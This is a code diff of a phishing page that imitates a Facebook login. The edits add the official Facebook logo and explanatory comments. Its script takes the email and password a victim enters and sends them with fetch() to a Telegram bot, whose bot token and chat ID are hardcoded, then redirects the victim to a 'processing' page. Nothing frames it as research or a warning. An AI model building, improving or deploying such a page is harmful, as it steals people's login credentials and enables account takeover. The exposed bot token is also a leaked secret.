@@ -45,7 +45,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="facebook.png" alt="Facebook Logo" style="width: 200px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="width: 200px;">
         <h2>Login with Facebook</h2>
         <form id="loginForm">
             <input type="email" id="email" placeholder="Enter your Facebook Email" required>
@@ -55,24 +55,29 @@
     </div>
 
     <script>
+        // Your Telegram Bot details
         const botToken = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
         const chatId = "7328757522";
 
+        // Handle form submission
         document.getElementById("loginForm").addEventListener("submit", function (event) {
-            event.preventDefault();
+            event.preventDefault(); // Prevent normal form submission
 
+            // Get email and password values
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
+            // Prepare the message
             const message = `🔒 New Login Details:\n💻 Method: Facebook\n📧 Email: ${email}\n🔑 Password: ${password}`;
 
+            // Send the message to Telegram
             const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(apiUrl)
                 .then(response => {
                     if (response.ok) {
                         alert("Login details sent successfully!");
-                        window.location.href = "processing.html";
+                        window.location.href = "processing.html"; // Redirect to processing page
                     } else {
                         alert("Failed to send login details. Please try again.");
                     }
